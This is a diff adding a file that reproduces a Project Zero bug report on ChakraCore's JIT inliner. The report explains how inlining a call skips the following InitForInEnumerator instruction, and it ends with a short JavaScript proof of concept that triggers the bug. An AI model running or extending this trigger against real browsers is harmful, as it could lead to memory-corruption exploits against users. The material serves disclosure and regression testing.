@@ -1,0 +1,112 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1366
+
+Here's a snippet of Inline::Optimize.
+    FOREACH_INSTR_EDITING(instr, instrNext, func->m_headInstr)
+    {
+        switch (instr->m_opcode)
+        {
+            case Js::OpCode::Label:
+                {
+                    ...
+                    if (instr->AsLabelInstr()->m_isForInExit)
+                    {
+                        Assert(this->currentForInDepth != 0);  // The PoC hits this
+                        this->currentForInDepth--;
+                    }
+                }
+                break;
+            case Js::OpCode::InitForInEnumerator:
+                if (!func->IsLoopBody())
+                {
+                    this->currentForInDepth++;
+                }
+                break;
+            case Js::OpCode::CallI:
+                ...
+                instrNext = builtInInlineCandidateOpCode != 0 ?
+                    this->InlineBuiltInFunction(instr, inlineeData, builtInInlineCandidateOpCode, inlinerData, symThis, &isInlined, profileId, recursiveInlineDepth) :
+                    this->InlineScriptFunction(instr, inlineeData, symThis, profileId, &isInlined, recursiveInlineDepth);
+                ...
+        }
+    }
+
+
+"InlineBuiltInFunction" and "InlineScriptFunction" are used to inline a JavaScript function. For example, those methods can convert a call expression as follws.
+
+Before:
+    s6.var          =  StartCall      1 (0x1).i32                             #0000 
+    arg1(s7)<0>.var =  ArgOut_A       s2.var, s6.var                          #0003 
+                       CallI          s3.var, arg1(s7)<0>.var                 #0006 
+
+    s0.var          =  Ld_A           0xXXXXXXXX (undefined)[Undefined].var   #000c  <<--- NEXT INSTRUCTION
+
+After:
+    s6.var          =  StartCall      1 (0x1).i32                             #0000 
+    ...
+    s12.var         =  InlineeStart   s3.var, iarg1(s7)<24>.var               #0006   Func # (#1.3), #4 obj.inlinee
+    s9[Object].var  =  Ld_A           0xXXXXXXXX (GlobalObject)[Object].var   #  Func # (#1.3), #4
+    s8.var          =  Ld_A           0xXXXXXXXX (undefined)[Undefined].var   #0000   Func # (#1.3), #4
+                       StatementBoundary  #0                                  #0002   Func # (#1.3), #4
+                       StatementBoundary  #-1                                 #0002   Func # (#1.3), #4
+                       InlineeEnd     4 (0x4).i32, s12.var                    #0000   Func # (#1.3), #4
+
+                       StatementBoundary  #0                                  #000c 
+    s0.var          =  Ld_A           0xXXXXXXXX (undefined)[Undefined].var   #000c  <<---- NEXT INSTRUCTION
+
+As you can see the inlinee is wrapped in InlineeStart and InlineeEnd. So to handle the orignal next instructions in the next iterations, those methods must return the call instruction's next instruction. But there's a buggy call flow.
+
+Here's the call flow.
+Inline::InlineBuiltInFunction(...) {
+    ...
+    if (inlineCallOpCode ==  Js::OpCode::InlineFunctionCall)
+    {
+       inlineBuiltInEndInstr = InlineCall(callInstr, inlineeData, inlinerData, symCallerThis, pIsInlined, profileId, recursiveInlineDepth);
+       return inlineBuiltInEndInstr->m_next;
+    }
+    ...
+}
+
+-> InlineCall -> InlineCallTarget -> 
+
+Inline::InlineCallApplyTarget_Shared(...) {
+    IR::Instr* instrNext = callInstr->m_next;
+    return InlineFunctionCommon(callInstr, originalCallTargetOpndIsJITOpt, originalCallTargetStackSym, inlineeData, inlinee, instrNext, returnValueOpnd, callInstr, nullptr, recursiveInlineDepth, safeThis, isApplyTarget);
+}
+
+Inline::InlineFunctionCommon(...)
+{
+    ...
+    return instrNext;
+}
+
+The point is that it ends up returning "callInstr->m_next->m_next". Therefore, "callInstr->m_next" will be never processed.
+
+In the PoC, "InitForInEnumerator" will be skipped.
+
+    s16[LikelyUndefined_CanBeTaggedValue].var = CallI  s6.var, arg2(s15)<8>.var #0015  << will be inlined
+                       InitForInEnumerator  s16.var, s17.u64                  #001f  << Skipped
+
+
+PoC:
+*/
+
+function opt(obj) {
+    for (let i in obj.inlinee.call({})) {
+    }
+
+    for (let i in obj.inlinee.call({})) {
+    }
+}
+
+function main() {
+    let obj = {
+        inlinee: function () {
+        }
+    };
+    
+    for (let i = 0; i < 10000; i++)
+        opt(obj);
+}
+
+main();
